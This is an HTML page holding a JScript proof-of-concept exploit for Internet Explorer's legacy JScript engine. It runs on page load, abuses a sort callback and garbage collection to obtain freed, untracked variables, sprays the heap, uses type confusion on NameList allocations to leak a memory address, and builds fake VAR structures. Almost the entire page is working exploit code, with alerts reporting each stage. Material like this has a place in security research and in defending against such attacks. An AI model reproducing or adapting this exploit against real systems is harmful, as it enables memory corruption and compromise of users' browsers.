<!DOCTYPE html>
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=EmulateIE8" />
<script language="JScript.Compact">

function CreateVar32(Type, ObjPtr, NextVar) {
   var Data = new Array(); // Every element of this array will be a WORD
   Data.push(Type, 0x00, 0x00, 0x00,             // type
          ObjPtr & 0xFFFF, (ObjPtr >> 16) & 0xFFFF,  // obj_ptr
          NextVar & 0xFFFF, (NextVar >> 16) & 0xFFFF);  // next_var
   return String.fromCharCode.apply(null, Data);
}
  
var UntrackedVarCount = 300;
var UntrackedVarSet;
var VarSpray;
var VarSprayCount = 20000; // 200 GcBlocks
var NameListAnchors;
var NameListAnchorCount = 20000;

var SortDepth = 0;
var SortArray = new Array(); // Array to be "sorted" by glitched method
// Setup - fills the sort array with arrays to be sorted. Done first to avoid the stack setup getting messed up.
for(i = 0; i < 310; i++) SortArray[i] = [0, 0];

function GlitchedSort(untracked_1, untracked_2) {
    untracked_1 = VarSpray[SortDepth*2];
    untracked_2 = VarSpray[SortDepth*2 + 1];
    if(SortDepth > (UntrackedVarCount / 2)) {
        VarSpray = new Array(); // Erase VarSpray
        CollectGarbage(); // Free the GcBlocks
        UntrackedVarSet.push(untracked_1);
        UntrackedVarSet.push(untracked_2);
        return 0;
    }
    
    SortDepth += 1;
    SortArray[SortDepth].sort(GlitchedSort);
    UntrackedVarSet.push(untracked_1);
    UntrackedVarSet.push(untracked_2);
    return 0;
}

function NewUntrackedVarSet(Count) {
	SortDepth = 0;
    VarSpray = new Array();
    NameListAnchors = new Array();
    UntrackedVarSet = new Array();
    for(i = 0; i < NameListAnchorCount; i++) NameListAnchors[i] = new Object(); // Overlay must happen before var spray
    for(i = 0; i < VarSprayCount; i++) VarSpray[i] = new Object();
    CollectGarbage();
    SortArray[0].sort(GlitchedSort); // Exploit
}

var AnchorObjectsBackup;

function ReClaimNameList(AnchorIndex, Value, PropertyName) {
    CollectGarbage(); // Get rid of anything lingering that might screw up the exploit
    AnchorObjectsBackup[AnchorIndex] = null; // Erase the object to be replaced
    CollectGarbage(); // Clear leak
    AnchorObjectsBackup[AnchorIndex] = new Object();
	AnchorObjectsBackup[AnchorIndex][Array(379).join('A')] = 1; // 0x17a property name size for 0x648 NameList allocation size
	AnchorObjectsBackup[AnchorIndex]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
	AnchorObjectsBackup[AnchorIndex]["\u0003"] = 1;
	AnchorObjectsBackup[AnchorIndex][PropertyName] = Value; // The mutable variable
}

function Exploit() {
	var LFHBlocks = new Array();

	// Trigger LFH for a size of 0x648

	for(i = 0; i < 50; i++) {
        Temp = new Object();
        Temp[Array(379).join('A')] = 1; // Property name size of 0x17a (378) will produce an allocation of 0x648 bytes
        LFHBlocks.push(Temp);
    }
	
	// New set of untracked vars in freed GcBlock
	
	NewUntrackedVarSet(UntrackedVarCount);
	
	// Re-claim with type confusion NameLists
	
	for(i = 0; i < NameListAnchorCount; i++) {
		NameListAnchors[i][Array(379).join('A')] = 1; // 0x17a property name size for 0x648 NameList allocation size
		NameListAnchors[i]["BBBBBBBBB"] = 1; // 11*2 = 22 in 64-bit, 9*2 = 18 bytes in 32-bit
		NameListAnchors[i]["\u0003"] = 1; // This ends up in the VVAL hash/name length to be type confused with an integer VAR
		NameListAnchors[i]["C"] = i; // The address of this VVAL will be leaked
	}
		
	// Leak final VVAL address from one of the NameLists
	
	AnchorObjectsBackup = NameListAnchors; // Prevent it from being freed and losing our leaked pointer
    
	var LeakedVvalAddress = 0;
	
    for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number" && UntrackedVarSet[i] > 0x1000) {
            LeakedVvalAddress = UntrackedVarSet[i];
			break;
        }
    }

	if(LeakedVvalAddress != 0) {
		alert("leaked final VVAL address of " + LeakedVvalAddress.toString(16));
	}
	else {
		alert("Failed to leak final VVAL address");
	}
	
	var PrimaryVvalPropName = "AA"; // 2 wide chars (4 bytes) plus the 4 byte BSTR length gives 8 bytes: the size of the two GcBlock linked list pointers. Everything after this point can be fake VARs and a tail padding.

    for(i=0; i < 46; i++) {
        PrimaryVvalPropName += CreateVar32(0x80, LeakedVvalAddress, 0);
    }
	
	while(PrimaryVvalPropName.length < 0x17a) PrimaryVvalPropName += "A"; // Dynamically pad the end of the proeprty name to a length of 0x17a

	// New set of untracked vars in freed GcBlock
	
	NewUntrackedVarSet(UntrackedVarCount);
	
	// Re-claim with leaked VVAL address vars
	
	for(i = 0; i < NameListAnchorCount; i++) {
		NameListAnchors[i][PrimaryVvalPropName] = 1;
	}
	
	// Extract NameList anchor index through untracked var dereference to leaked VVAL prefix VAR
	
	var LeakedAnchorIndex = -1;
	var LeakedVvalVar;

	for(i = 0; i < UntrackedVarSet.length; i++) {
        if(typeof UntrackedVarSet[i] === "number") {
            LeakedAnchorIndex = parseInt(UntrackedVarSet[i] + ""); // Attempting to access the untracked var without parseInt will fail ("null or not an object")
            LeakedVvalVar = UntrackedVarSet[i]; // The + "" trick alone does not seeem to be enough to populate this with the actual value
			break;
        }
    }
	
	alert("Leaked anchor object index: " + LeakedAnchorIndex.toString(16));
	
	// Verify that the VAR within the leaked VVAL can be influenced by directly freeing/re-claiming the NameList associated with the leaked NameList anchor object (whose index is now known)
	
	ReClaimNameList(LeakedAnchorIndex, 0x99, "A"); // 0x99 magic should be the
	
	if(LeakedVvalVar + "" == 0x99) {
		alert("Leaked anchor object re-claim verification success");
	}
	else {
		alert("Leaked anchor object re-claim verification failed");
	}
}

Exploit();

</script>
</head>
</html>